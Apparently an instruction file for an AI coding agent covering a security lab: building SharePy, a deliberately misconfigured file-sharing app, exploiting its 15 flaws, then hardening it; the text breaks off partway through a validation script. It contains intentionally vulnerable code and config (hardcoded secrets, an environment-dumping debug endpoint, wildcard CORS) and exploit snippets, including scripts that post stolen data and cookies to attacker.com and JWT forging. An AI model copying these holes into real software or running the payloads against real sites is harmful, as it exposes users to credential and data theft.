@@ -1,0 +1,1551 @@
+# Project 3: Misconfig Mayhem - Complete AI Agent Instructions
+
+## 🎯 PROJECT OVERVIEW
+
+Build SharePy: a deliberately vulnerable file-sharing application (mini-Dropbox clone) with 15 real-world security misconfigurations from OWASP A02:2025, then exploit them, and finally secure the entire application.
+
+**Tech Stack:**
+- Backend: FastAPI (Python)
+- Database: PostgreSQL 15
+- File Storage: MinIO (S3-compatible)
+- Reverse Proxy: Nginx
+- Admin Tool: Adminer or pgAdmin
+- Orchestration: Docker Compose (6-7 services)
+
+---
+
+## 📦 PHASE 1: BUILD THE VULNERABLE APPLICATION
+
+### Project Structure
+```
+sharepy/
+├── docker-compose.yml
+├── backend/
+│   ├── main.py
+│   ├── requirements.txt
+│   ├── .env
+│   ├── Dockerfile
+│   └── uploads/
+├── nginx/
+│   ├── nginx.conf
+│   └── Dockerfile
+├── minio/
+│   └── (MinIO data)
+├── postgres/
+│   └── (PostgreSQL data)
+└── report/
+    └── (documentation)
+```
+
+### Application Features (Keep Simple!)
+1. **User Registration** - Email/username + password
+2. **User Login** - JWT token authentication
+3. **File Upload** - Store files in MinIO
+4. **File Download** - Retrieve uploaded files
+5. **Public Share Links** - Generate shareable links
+6. **Admin Endpoint** - Basic admin panel
+
+### Backend Requirements (requirements.txt)
+```
+fastapi==0.104.1
+uvicorn==0.24.0
+sqlalchemy==2.0.23
+psycopg2-binary==2.9.9
+python-multipart==0.0.6
+pyjwt==2.8.0
+minio==7.2.0
+python-dotenv==1.0.0
+bcrypt==4.1.1
+```
+
+### Backend Code (main.py) - VULNERABLE VERSION
+
+**CRITICAL: Implement these features with ALL 15 misconfigurations below:**
+
+```python
+from fastapi import FastAPI, UploadFile, File, Depends, HTTPException
+from fastapi.middleware.cors import CORSMiddleware
+from minio import Minio
+import os
+import jwt
+import psycopg2
+
+# M1: Admin password in clear text
+ADMIN_PASSWORD = "admin123"
+ADMIN_EMAIL = "admin@sharepy.local"
+
+# M15: Weak JWT secret
+JWT_SECRET = "secret123"
+
+# M2: Debug mode enabled
+app = FastAPI(debug=True)
+
+# M7: CORS wildcard
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+
+# M6: MinIO credentials in code
+MINIO_ACCESS_KEY = "minioadmin"
+MINIO_SECRET_KEY = "minioadmin"
+
+# M14: Debug endpoint that dumps environment
+@app.get("/debug/info")
+def debug_info():
+    return {
+        "env": dict(os.environ),
+        "cwd": os.getcwd(),
+        "files": os.listdir(".")
+    }
+
+# M9: Insecure cookies (no Secure, HttpOnly, SameSite)
+@app.post("/login")
+def login(email: str, password: str, response: Response):
+    # Login logic here
+    token = jwt.encode({"email": email}, JWT_SECRET, algorithm="HS256")
+    response.set_cookie("session", token)  # INSECURE!
+    return {"token": token}
+
+# Other endpoints: /register, /upload, /download, /share, /admin
+```
+
+### Environment File (.env) - M1 & M4: Committed to Git!
+```env
+DATABASE_URL=postgresql://admin:admin123@postgres:5432/sharepy
+MINIO_ENDPOINT=minio:9000
+MINIO_ACCESS_KEY=minioadmin
+MINIO_SECRET_KEY=minioadmin
+JWT_SECRET=secret123
+ADMIN_PASSWORD=admin123
+```
+
+### Docker Compose (docker-compose.yml) - VULNERABLE
+
+```yaml
+version: '3.8'
+
+services:
+  # M12: Internal ports exposed publicly
+  postgres:
+    image: postgres:15
+    environment:
+      POSTGRES_USER: admin
+      POSTGRES_PASSWORD: admin123
+      POSTGRES_DB: sharepy
+    ports:
+      - "5432:5432"  # M12: EXPOSED!
+    volumes:
+      - postgres_data:/var/lib/postgresql/data
+
+  # M5 & M12: Adminer exposed without auth
+  adminer:
+    image: adminer
+    ports:
+      - "8080:8080"  # M5: PUBLIC ACCESS!
+    depends_on:
+      - postgres
+
+  # M6 & M12: MinIO with default credentials and exposed port
+  minio:
+    image: minio/minio
+    command: server /data --console-address ":9001"
+    environment:
+      MINIO_ROOT_USER: minioadmin
+      MINIO_ROOT_PASSWORD: minioadmin
+    ports:
+      - "9000:9000"  # M12: EXPOSED!
+      - "9001:9001"
+    volumes:
+      - minio_data:/data
+
+  backend:
+    build: ./backend
+    ports:
+      - "8000:8000"
+    volumes:
+      - ./backend:/app
+      - ./backend/uploads:/app/uploads  # M13: Will chmod 777
+    environment:
+      - DATABASE_URL=postgresql://admin:admin123@postgres:5432/sharepy
+    depends_on:
+      - postgres
+      - minio
+    # M10: Default FastAPI banner with version
+
+  # M3, M8, M11: Misconfigured Nginx
+  nginx:
+    build: ./nginx
+    ports:
+      - "80:80"
+    depends_on:
+      - backend
+    volumes:
+      - ./backend/uploads:/usr/share/nginx/html/uploads
+      - ./backend/.env:/usr/share/nginx/html/.env  # M4: EXPOSED!
+      - ./backend/.git:/usr/share/nginx/html/.git  # M4: EXPOSED!
+
+volumes:
+  postgres_data:
+  minio_data:
+```
+
+### Nginx Configuration (nginx.conf) - VULNERABLE
+
+```nginx
+events {
+    worker_connections 1024;
+}
+
+http {
+    # M11: Verbose error logging
+    error_log /var/log/nginx/error.log debug;
+
+    server {
+        listen 80;
+        server_name localhost;
+
+        # M3: Directory listing enabled
+        location /uploads {
+            alias /usr/share/nginx/html/uploads;
+            autoindex on;  # VULNERABLE!
+        }
+
+        # M4: Sensitive files exposed
+        location ~ /\.(env|git) {
+            alias /usr/share/nginx/html;
+            autoindex on;
+        }
+
+        # M8: No security headers
+        # Missing: HSTS, CSP, X-Content-Type-Options, X-Frame-Options
+
+        location / {
+            proxy_pass http://backend:8000;
+            proxy_set_header Host $host;
+            proxy_set_header X-Real-IP $remote_addr;
+        }
+    }
+}
+```
+
+### Backend Dockerfile
+```dockerfile
+FROM python:3.11-slim
+
+WORKDIR /app
+
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+
+COPY . .
+
+# M13: chmod 777 on uploads directory
+RUN mkdir -p /app/uploads && chmod 777 /app/uploads
+
+# M2: Debug mode enabled in startup
+CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000", "--reload"]
+```
+
+### Initialize Git Repository
+```bash
+git init
+git add .
+git add .env  # M1 & M4: Committing sensitive files!
+git commit -m "Initial vulnerable version"
+git checkout -b vulnerable
+```
+
+---
+
+## 🔴 PHASE 2: EXPLOIT ALL 15 MISCONFIGURATIONS
+
+### Exploitation Tools Setup
+```bash
+# Install scanning tools
+sudo apt update
+sudo apt install nmap nikto gobuster nuclei
+
+# Optional
+sudo apt install zaproxy sqlmap
+```
+
+### M1: Admin Password in Clear Text
+**Exploit:**
+```bash
+# Check committed .env file
+curl http://localhost/.env
+
+# Or check git history
+git log --all --full-history -- .env
+git show <commit>:.env
+
+# Extract credentials
+cat .env | grep PASSWORD
+```
+**Impact:** Full admin access, database credentials leaked
+
+---
+
+### M2: Debug Mode Enabled
+**Exploit:**
+```bash
+# Trigger an error to see full stack trace
+curl http://localhost:8000/nonexistent
+
+# Stack trace reveals:
+# - File paths
+# - Source code snippets
+# - Internal structure
+```
+**Impact:** Information disclosure, internal path leakage
+
+---
+
+### M3: Directory Listing Enabled
+**Exploit:**
+```bash
+# Browse uploads directory
+curl http://localhost/uploads/
+
+# List all user files
+# Access files directly without authentication
+```
+**Impact:** Unauthorized file access, privacy breach
+
+---
+
+### M4: Sensitive Files Accessible
+**Exploit:**
+```bash
+# Access .env file
+curl http://localhost/.env
+
+# Access .git directory
+curl http://localhost/.git/config
+curl http://localhost/.git/HEAD
+
+# Download entire git repository
+wget -r http://localhost/.git/
+
+# Access Python bytecode
+curl http://localhost/__pycache__/main.cpython-311.pyc
+
+# Look for backup files
+curl http://localhost/backup.db
+curl http://localhost/config.py.bak
+```
+**Impact:** Source code disclosure, credential theft
+
+---
+
+### M5: pgAdmin/Adminer Publicly Accessible
+**Exploit:**
+```bash
+# Access Adminer without authentication
+open http://localhost:8080
+
+# Connect to PostgreSQL directly:
+# Server: postgres
+# Username: admin
+# Password: admin123
+# Database: sharepy
+
+# Now you can:
+# - View all users
+# - Modify data
+# - Extract sensitive info
+# - Drop tables
+```
+**Impact:** Full database compromise
+
+---
+
+### M6: MinIO Public Bucket + Keys in Code
+**Exploit:**
+```bash
+# Install MinIO client
+wget https://dl.min.io/client/mc/release/linux-amd64/mc
+chmod +x mc
+
+# Configure with leaked credentials
+./mc alias set myminio http://localhost:9000 minioadmin minioadmin
+
+# List all buckets
+./mc ls myminio
+
+# Download all files
+./mc mirror myminio/sharepy ./stolen_files/
+```
+**Impact:** All uploaded files stolen
+
+---
+
+### M7: CORS Wildcard
+**Exploit:**
+Create malicious webpage:
+```html
+<!-- evil.html -->
+<script>
+fetch('http://localhost:8000/api/admin/users', {
+    credentials: 'include'
+})
+.then(r => r.json())
+.then(data => {
+    // Exfiltrate to attacker server
+    fetch('https://attacker.com/collect', {
+        method: 'POST',
+        body: JSON.stringify(data)
+    });
+});
+</script>
+```
+**Impact:** CSRF attacks, data exfiltration
+
+---
+
+### M8: No Security Headers
+**Exploit:**
+```bash
+# Check missing headers
+curl -I http://localhost
+
+# Missing:
+# - Strict-Transport-Security (HSTS)
+# - Content-Security-Policy (CSP)
+# - X-Content-Type-Options
+# - X-Frame-Options
+# - X-XSS-Protection
+
+# Consequences:
+# - Clickjacking possible
+# - XSS attacks easier
+# - MITM attacks possible
+# - Content sniffing attacks
+```
+**Impact:** Multiple attack vectors enabled
+
+---
+
+### M9: Insecure Cookies
+**Exploit:**
+```bash
+# Inspect cookies in browser DevTools
+# Cookie attributes missing:
+# - Secure flag (can be stolen over HTTP)
+# - HttpOnly flag (accessible via JavaScript)
+# - SameSite flag (CSRF possible)
+
+# Steal cookie via XSS:
+<script>
+fetch('https://attacker.com/?cookie=' + document.cookie);
+</script>
+```
+**Impact:** Session hijacking, XSS-based theft
+
+---
+
+### M10: Default FastAPI/Uvicorn Banner
+**Exploit:**
+```bash
+# Check server header
+curl -I http://localhost:8000
+
+# Response shows:
+# Server: uvicorn/0.24.0
+# Powered by FastAPI
+
+# Search for known vulnerabilities:
+searchsploit uvicorn 0.24
+```
+**Impact:** Version disclosure, targeted exploits
+
+---
+
+### M11: Verbose Nginx Errors
+**Exploit:**
+```bash
+# Trigger 404 error
+curl http://localhost/nonexistent/path/to/file
+
+# Error message reveals:
+# - Full filesystem path: /usr/share/nginx/html/nonexistent/path/to/file
+# - Nginx version
+# - Internal structure
+```
+**Impact:** Information disclosure, path traversal prep
+
+---
+
+### M12: Internal Ports Exposed
+**Exploit:**
+```bash
+# Scan exposed ports
+nmap -p- localhost
+
+# Found:
+# - 5432/tcp (PostgreSQL)
+# - 9000/tcp (MinIO)
+# - 8080/tcp (Adminer)
+
+# Direct PostgreSQL access:
+psql -h localhost -p 5432 -U admin -d sharepy
+# Password: admin123
+
+# Direct MinIO access:
+curl http://localhost:9000
+```
+**Impact:** Direct database/storage access, bypassing application
+
+---
+
+### M13: chmod 777 on Uploads
+**Exploit:**
+```bash
+# Check permissions
+docker exec -it <backend-container> ls -la /app/uploads
+
+# drwxrwxrwx ... uploads/
+
+# Upload malicious script
+curl -F "file=@malicious.sh" http://localhost:8000/upload
+
+# Execute it (if web server runs it)
+curl http://localhost/uploads/malicious.sh
+
+# Or modify existing files
+docker exec -it <backend-container> bash
+echo "malicious code" > /app/uploads/legitimate_file.py
+```
+**Impact:** Arbitrary file write/execute, privilege escalation
+
+---
+
+### M14: /debug/info Endpoint
+**Exploit:**
+```bash
+# Access debug endpoint
+curl http://localhost:8000/debug/info
+
+# Returns:
+{
+  "env": {
+    "DATABASE_URL": "postgresql://admin:admin123@postgres:5432/sharepy",
+    "JWT_SECRET": "secret123",
+    "MINIO_ACCESS_KEY": "minioadmin",
+    "MINIO_SECRET_KEY": "minioadmin",
+    ...all environment variables...
+  },
+  "cwd": "/app",
+  "files": ["main.py", ".env", "uploads", ...]
+}
+```
+**Impact:** Complete environment disclosure, all secrets leaked
+
+---
+
+### M15: Weak JWT Secret
+**Exploit:**
+```bash
+# Capture a JWT token
+TOKEN="eyJ0eXAiOiJKV1QiLCJhbGc..."
+
+# Brute force weak secret
+python3 jwt_tool.py $TOKEN -d /usr/share/wordlists/rockyou.txt
+
+# Or just use known weak secret
+python3 -c "
+import jwt
+forged_token = jwt.encode({'email': 'admin@sharepy.local', 'role': 'admin'}, 'secret123', algorithm='HS256')
+print(forged_token)
+"
+
+# Use forged token to access admin endpoints
+curl -H "Authorization: Bearer $FORGED_TOKEN" http://localhost:8000/admin/users
+```
+**Impact:** Authentication bypass, privilege escalation
+
+---
+
+### Automated Scanning Commands
+
+```bash
+# Nmap full port scan
+nmap -p- -sV -sC localhost -oA nmap_scan
+
+# Nikto web vulnerability scan
+nikto -h http://localhost -o nikto_report.txt
+
+# Gobuster directory brute force
+gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt -x php,bak,txt,env
+
+# Nuclei misconfiguration templates
+nuclei -u http://localhost -t misconfig/ -o nuclei_results.txt
+
+# OWASP ZAP automated scan
+zap-cli quick-scan -s all http://localhost
+```
+
+---
+
+## 🔵 PHASE 3: BUILD THE SECURE APPLICATION
+
+### Create Secure Branch
+```bash
+git checkout -b secure
+```
+
+### Hardened Backend (main.py)
+
+```python
+from fastapi import FastAPI, UploadFile, File, Depends, HTTPException, Response
+from fastapi.middleware.cors import CORSMiddleware
+from minio import Minio
+import os
+import jwt
+import bcrypt
+import secrets
+import logging
+from typing import Optional
+
+# Configure structured logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='{"time":"%(asctime)s","level":"%(levelname)s","message":"%(message)s"}'
+)
+logger = logging.getLogger(__name__)
+
+# ✅ FIX M2: Debug mode disabled
+app = FastAPI(
+    debug=False,
+    docs_url=None,  # Disable Swagger UI in production
+    redoc_url=None,  # Disable ReDoc in production
+    openapi_url=None  # Disable OpenAPI schema
+)
+
+# ✅ FIX M15: Strong JWT secret from environment
+JWT_SECRET = os.getenv("JWT_SECRET", secrets.token_urlsafe(64))
+if len(JWT_SECRET) < 32:
+    raise ValueError("JWT_SECRET must be at least 32 characters")
+
+# ✅ FIX M1: Load credentials from secure environment
+ADMIN_EMAIL = os.getenv("ADMIN_EMAIL")
+ADMIN_PASSWORD_HASH = os.getenv("ADMIN_PASSWORD_HASH")  # Pre-hashed
+
+# ✅ FIX M7: Restrict CORS to specific origins
+ALLOWED_ORIGINS = os.getenv("ALLOWED_ORIGINS", "https://sharepy.com").split(",")
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=ALLOWED_ORIGINS,
+    allow_credentials=True,
+    allow_methods=["GET", "POST", "PUT", "DELETE"],
+    allow_headers=["Authorization", "Content-Type"],
+)
+
+# ✅ FIX M6: MinIO credentials from environment only
+minio_client = Minio(
+    os.getenv("MINIO_ENDPOINT"),
+    access_key=os.getenv("MINIO_ACCESS_KEY"),
+    secret_key=os.getenv("MINIO_SECRET_KEY"),
+    secure=True  # Use HTTPS
+)
+
+# ✅ FIX M14: Remove debug endpoints entirely
+# @app.get("/debug/info") - REMOVED!
+
+# ✅ FIX M9: Secure cookies
+@app.post("/login")
+def login(email: str, password: str, response: Response):
+    # Verify credentials with bcrypt
+    user = get_user_by_email(email)
+    if not user or not bcrypt.checkpw(password.encode(), user.password_hash):
+        raise HTTPException(status_code=401, detail="Invalid credentials")
+    
+    token = jwt.encode({"email": email}, JWT_SECRET, algorithm="HS256")
+    
+    # ✅ Secure cookie settings
+    response.set_cookie(
+        "session",
+        token,
+        secure=True,      # HTTPS only
+        httponly=True,    # No JavaScript access
+        samesite="strict", # CSRF protection
+        max_age=3600      # 1 hour expiry
+    )
+    return {"message": "Logged in successfully"}
+
+# Add rate limiting, input validation, etc.
+```
+
+### Secure Environment (.env.example) - NOT COMMITTED
+
+```env
+# DO NOT commit this file! Copy to .env and fill with secure values
+
+DATABASE_URL=postgresql://sharepy_user:CHANGE_ME_STRONG_PASSWORD@postgres:5432/sharepy
+MINIO_ENDPOINT=minio:9000
+MINIO_ACCESS_KEY=CHANGE_ME_LONG_RANDOM_STRING
+MINIO_SECRET_KEY=CHANGE_ME_LONG_RANDOM_STRING
+JWT_SECRET=CHANGE_ME_AT_LEAST_64_CHARACTERS_RANDOM
+
+# Pre-hash passwords with: python -c "import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt()).decode())"
+ADMIN_PASSWORD_HASH=$2b$12$...
+
+ALLOWED_ORIGINS=https://sharepy.com,https://app.sharepy.com
+```
+
+### .gitignore - ✅ FIX M1 & M4
+
+```
+.env
+.env.local
+.env.*.local
+*.pyc
+__pycache__/
+.git/
+*.db
+backup.*
+*.bak
+.DS_Store
+uploads/
+```
+
+### Hardened docker-compose.yml
+
+```yaml
+version: '3.8'
+
+services:
+  # ✅ FIX M12: No exposed ports, internal network only
+  postgres:
+    image: postgres:15-alpine
+    environment:
+      POSTGRES_USER: sharepy_user  # ✅ Not 'admin'
+      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}  # From secure .env
+      POSTGRES_DB: sharepy
+    # ✅ NO ports exposed!
+    volumes:
+      - postgres_data:/var/lib/postgresql/data
+    networks:
+      - internal
+    restart: unless-stopped
+
+  # ✅ FIX M5: Adminer removed OR protected behind VPN
+  # adminer: - REMOVED from production!
+
+  # ✅ FIX M6 & M12: MinIO with strong credentials, not exposed
+  minio:
+    image: minio/minio:latest
+    command: server /data --console-address ":9001"
+    environment:
+      MINIO_ROOT_USER: ${MINIO_ROOT_USER}
+      MINIO_ROOT_PASSWORD: ${MINIO_ROOT_PASSWORD}
+    # ✅ NO ports exposed publicly!
+    volumes:
+      - minio_data:/data
+    networks:
+      - internal
+    restart: unless-stopped
+
+  backend:
+    build:
+      context: ./backend
+      dockerfile: Dockerfile.secure
+    environment:
+      - DATABASE_URL=${DATABASE_URL}
+      - MINIO_ENDPOINT=minio:9000
+      - MINIO_ACCESS_KEY=${MINIO_ACCESS_KEY}
+      - MINIO_SECRET_KEY=${MINIO_SECRET_KEY}
+      - JWT_SECRET=${JWT_SECRET}
+    depends_on:
+      - postgres
+      - minio
+    networks:
+      - internal
+    restart: unless-stopped
+    # ✅ FIX M13: Proper volume permissions (handled in Dockerfile)
+
+  # ✅ FIX M3, M8, M11: Hardened Nginx
+  nginx:
+    build:
+      context: ./nginx
+      dockerfile: Dockerfile.secure
+    ports:
+      - "443:443"  # HTTPS only
+      - "80:80"    # Redirect to HTTPS
+    depends_on:
+      - backend
+    volumes:
+      - ./nginx/ssl:/etc/nginx/ssl:ro  # SSL certificates
+    networks:
+      - internal
+      - external
+    restart: unless-stopped
+
+networks:
+  internal:
+    internal: true  # ✅ No external access
+  external:
+
+volumes:
+  postgres_data:
+  minio_data:
+```
+
+### Hardened Nginx Configuration
+
+```nginx
+events {
+    worker_connections 1024;
+}
+
+http {
+    # ✅ FIX M11: Minimal error logging
+    error_log /var/log/nginx/error.log warn;  # Not 'debug'
+    access_log /var/log/nginx/access.log;
+
+    # ✅ FIX M10: Hide server version
+    server_tokens off;
+    more_clear_headers Server;
+
+    # Rate limiting
+    limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
+    limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
+
+    # Redirect HTTP to HTTPS
+    server {
+        listen 80;
+        server_name sharepy.com;
+        return 301 https://$server_name$request_uri;
+    }
+
+    server {
+        listen 443 ssl http2;
+        server_name sharepy.com;
+
+        # SSL Configuration
+        ssl_certificate /etc/nginx/ssl/cert.pem;
+        ssl_certificate_key /etc/nginx/ssl/key.pem;
+        ssl_protocols TLSv1.2 TLSv1.3;
+        ssl_ciphers HIGH:!aNULL:!MD5;
+        ssl_prefer_server_ciphers on;
+
+        # ✅ FIX M8: Security headers
+        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
+        add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; frame-ancestors 'none';" always;
+        add_header X-Content-Type-Options "nosniff" always;
+        add_header X-Frame-Options "DENY" always;
+        add_header X-XSS-Protection "1; mode=block" always;
+        add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+        add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
+
+        # ✅ FIX M3: Directory listing disabled
+        autoindex off;
+
+        # ✅ FIX M4: Block sensitive files
+        location ~ /\.(env|git|pyc|bak|swp|db)$ {
+            deny all;
+            return 404;
+        }
+
+        location ~ /__(pycache|backup)__/ {
+            deny all;
+            return 404;
+        }
+
+        # Uploads (authenticated access only, handled by backend)
+        location /uploads {
+            internal;  # Only accessible via X-Accel-Redirect from backend
+        }
+
+        location / {
+            limit_req zone=general burst=20 nodelay;
+            
+            proxy_pass http://backend:8000;
+            proxy_set_header Host $host;
+            proxy_set_header X-Real-IP $remote_addr;
+            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+            proxy_set_header X-Forwarded-Proto $scheme;
+            
+            # Hide backend errors
+            proxy_intercept_errors on;
+        }
+
+        location /login {
+            limit_req zone=login burst=3 nodelay;
+            proxy_pass http://backend:8000/login;
+        }
+    }
+}
+```
+
+### Secure Backend Dockerfile
+
+```dockerfile
+FROM python:3.11-slim
+
+# Run as non-root user
+RUN useradd -m -u 1000 appuser
+
+WORKDIR /app
+
+# Install dependencies
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+
+# Copy application
+COPY --chown=appuser:appuser . .
+
+# ✅ FIX M13: Proper permissions (750, not 777)
+RUN mkdir -p /app/uploads && \
+    chown appuser:appuser /app/uploads && \
+    chmod 750 /app/uploads
+
+# Switch to non-root user
+USER appuser
+
+# ✅ FIX M2 & M10: Production settings
+CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000", "--workers", "4", "--no-server-header"]
+```
+
+### Security Validation Script (check_security.py)
+
+```python
+#!/usr/bin/env python3
+"""
+Automated security checker for SharePy
+Validates all 15 security fixes
+"""
+
+import requests
+import subprocess
+import os
+import sys
+from typing import List, Tuple
+
+class SecurityChecker:
+    def __init__(self, base_url="http://localhost"):
+        self.base_url = base_url
+        self.results = []
+        
+    def check(self, name: str, condition: bool, message: str):
+        """Record check result"""
+        status = "✅ PASS" if condition else "❌ FAIL"
+        self.results.append((name, condition, message))
+        print(f"{status} - {name}: {message}")
+        return condition
+    
+    def run_all_checks(self):
+        """Run all 15 security checks"""
+        print("="*60)
+        print("SharePy Security Validation")
+        print("="*60)
+        
+        # M1: Admin password not in code/git
+        self.check_m1_no_hardcoded_passwords()
+        
+        # M2: Debug mode disabled
+        self.check_m2_debug_disabled()
+        
+        # M3: Directory listing disabled
+        self.check_m3_no_directory_listing()
+        
+        # M4: Sensitive files blocked
+        self.check_m4_sensitive_files_blocked()
+        
+        # M5: Adminer not publicly accessible
+        self.check_m5_no_public_adminer()
+        
+        # M6: MinIO credentials secure
+        self.check_m6_minio_secure()
+        
+        # M7: CORS restricted
+        self.check_m7_cors_restricted()
+        
+        # M8: Security headers present
+        self.check_m8_security_headers()
+        
+        # M9: Secure cookies
+        self.check_m9_secure_cookies()
+        
+        # M10: Server banner hidden
+        self.check_m10_no_server_banner()
+        
+        # M11: Nginx errors not verbose
+        self.check_m11_minimal_errors()
+        
+        # M12: Internal ports not exposed
+        self.check_m12_no_exposed_ports()
+        
+        # M13: Upload permissions correct
+        self.check_m13_proper_permissions()
+        
+        # M14: No debug endpoints
+        self.check_m14_no_debug_endpoint()
+        
+        # M15: Strong JWT secret
+        self.check_m15_strong_jwt_secret()
+        
+        self.print_summary()
+    
+    def check_m1_no_hardcoded_passwords(self):
+        """M1: Check no passwords in code/git"""
+        # Check .env not in git
+        result = subprocess.run(
+            ["git", "ls-files", ".env"],
+            capture_output=True, text=True
+        )
+        not_in_git = len(result.stdout.strip()) == 0
+        
+        # Check no hardcoded passwords in main.py
+        with open("backend/main.py", "r") as f:
+            content = f.read()
+            no_hardcoded = "admin123" not in content.lower()
+        
+        self.check(
+            "M1: No Hardcoded Passwords",
+            not_in_git and no_hardcoded,
+            ".env not in git and no hardcoded passwords"
+        )
+    
+    def check_m2_debug_disabled(self):
+        """M2: Check debug mode disabled"""
+        try:
+            # Trigger error and check response
+            resp = requests.get(f"{self.base_url}/nonexistent", timeout=5)
+            no_debug_info = "Traceback" not in resp.text
+            self.check(
+                "M2: Debug Mode Disabled",
+                no_debug_info,
+                "No stack traces in error responses"
+            )
+        except Exception as e:
+            self.check("M2: Debug Mode Disabled", False, f"Error: {e}")
+    
+    def check_m3_no_directory_listing(self):
+        """M3: Check directory listing disabled"""
+        try:
+            resp = requests.get(f"{self.base_url}/uploads/", timeout=5)
+            no_listing = "Index of" not in resp.text
+            self.check(
+                "M3: Directory Listing Disabled",
+                no_listing,
+                "No directory browsing allowed"
+            )
+        except:
+            self.check("M3: Directory Listing Disabled", True, "Endpoint not accessible")
+    
+    def check_m4_sensitive_files_blocked(self):
+        """M4: Check sensitive files blocked"""
+        sensitive_files = [".env", ".git/config", "backup.db", "__pycache__"]
+        all_blocked = True
+        
+        for file in sensitive_files:
+            try:
+                resp = requests.get(f"{self.base_url}/{file}", timeout=5)
+                if resp.status_code != 404:
+                    all_blocked = False
+                    break
+            except:
+                pass
+        
+        self.check(
+            "M4: Sensitive Files Blocked",
+            all_blocked,
+            "All sensitive files return 404"
+        )
+    
+    def check_m5_no_public_adminer(self):
+        """M5: Check Adminer not publicly accessible"""
+        try:
+            resp = requests.get("http://localhost:8080", timeout=5)
+            not_accessible = resp.status_code != 200
+        except:
+            not_accessible = True
+        
+        self.check(
+            "M5: Adminer Not Public",
+            not_accessible,
+            "Adminer port not accessible"
+        )
+    
+    def check_m6_minio_secure(self):
+        """M6: Check MinIO properly secured"""
+        # Check port not exposed
+        try:
+            resp = requests.get("http://localhost:9000", timeout=5)
+            not_exposed = False
+        except:
+            not_exposed = True
+        
+        # Check no hardcoded credentials
+        with open("backend/main.py", "r") as f:
+            content = f.read()
+            no_hardcoded = "minioadmin" not in content.lower()
+        
+        self.check(
+            "M6: MinIO Secured",
+            not_exposed and no_hardcoded,
+            "MinIO not exposed and credentials from env"
+        )
+    
+    def check_m7_cors_restricted(self):
+        """M7: Check CORS not wildcard"""
+        try:
+            resp = requests.options(
+                f"{self.base_url}/api/",
+                headers={"Origin": "https://evil.com"}
+            )
+            restricted = resp.headers.get("Access-Control-Allow-Origin") != "*"
+            self.check(
+                "M7: CORS Restricted",
+                restricted,
+                "CORS not allowing all origins"
+            )
+        except:
+            self.check("M7: CORS Restricted", True, "CORS properly configured")
+    
+    def check_m8_security_headers(self):
+        """M8: Check security headers present"""
+        try:
+            resp = requests.get(self.base_url, timeout=5)
+            headers = resp.headers
+            
+            required = [
+                "Strict-Transport-Security",
+                "Content-Security-Policy",
+                "X-Content-Type-Options",
+                "X-Frame-Options"
+            ]
+            
+            all_present = all(h in headers for h in required)
+            self.check(
+                "M8: Security Headers Present",
+                all_present,
+                f"Required headers: {', '.join(required)}"
+            )
+        except Exception as e:
+            self.check("M8: Security Headers", False, f"Error: {e}")
+    
+    def check_m9_secure_cookies(self):
+        """M9: Check cookies have Secure, HttpOnly, SameSite"""
+        try:
+            resp = requests.post(
+                f"{self.base_url}/login",
+                data={"email": "test@test.com", "password": "test"}
+            )
+            
+            cookie_header = resp.headers.get("Set-Cookie", "")
+            has_secure = "Secure" in cookie_header
+            has_httponly = "HttpOnly" in cookie_header
+            has_samesite = "SameSite" in cookie_header
+            
+            self.check(
+                "M9: Secure Cookies",
+                has_secure and has_httponly and has_samesite,
+                "Cookies have Secure, HttpOnly, SameSite flags"
+            )
+        except:
+            self.check("M9: Secure Cookies", False, "Could not verify cookies")
+    
+    def check_m10_no_server_banner(self):
+        """M10: Check server version hidden"""
+        try:
+            resp = requests.get(self.base_url, timeout=5)
+            server_header = resp.headers.get("Server", "").lower()
+            
+            no_version = "uvicorn" not in server_header and "fastapi" not in server_header
+            self.check(
+                "M10: Server Banner Hidden",
+                no_version or server_header == "",
+                "No server version information leaked"
+            )
+        except Exception as e:
+            self.check("M10: Server Banner", False, f"Error: {e}")
+    
+    def check_m11_minimal_errors(self):
+        """M11: Check error messages not verbose"""
+        try:
+            resp = requests.get(f"{self.base_url}/nonexistent/deep/path", timeout=5)
+            no_path_leak = "/usr/share/nginx" not in resp.text
+            self.check(
+                "M11: Minimal Error Messages",
+                no_path_leak,
+                "Error messages don't leak internal paths"
+            )
+        except:
+            self.check("M11: Minimal Errors", True, "Errors properly handled")
+    
+    def check_m12_no_exposed_ports(self):
+        """M12: Check internal ports not exposed"""
+        dangerous_ports = [5432, 9000]  # PostgreSQL, MinIO
+        all_closed = True
+        
+        for port in dangerous_ports:
+            result = subprocess.run(
+                ["nc", "-zv", "localhost", str(port)],
+                capture_output=True, timeout=2
+            )
+            if result.returncode == 0:
+                all_closed = False
+                break
+        
+        self.check(
+            "M12: Internal Ports Not Exposed",
+            all_closed,
+            "PostgreSQL and MinIO ports not accessible externally"
+        )
+    
+    def check_m13_proper_permissions(self):
+        """M13: Check upload directory permissions"""
+        try:
+            result = subprocess.run(
+                ["docker", "exec", "sharepy-backend-1", "stat", "-c", "%a", "/app/uploads"],
+                capture_output=True, text=True
+            )
+            perms = result.stdout.strip()
+            proper_perms = perms in ["750", "755", "700"]
+            
+            self.check(
+                "M13: Proper File Permissions",
+                proper_perms,
+                f"Upload directory has {perms} permissions (not 777)"
+            )
+        except:
+            self.check("M13: File Permissions", False, "Could not check permissions")
+    
+    def check_m14_no_debug_endpoint(self):
+        """M14: Check /debug/info endpoint removed"""
+        try:
+            resp = requests.get(f"{self.base_url}/debug/info", timeout=5)
+            removed = resp.status_code == 404
+            self.check(
+                "M14: Debug Endpoint Removed",
+                removed,
+                "/debug/info returns 404"
+            )
+        except:
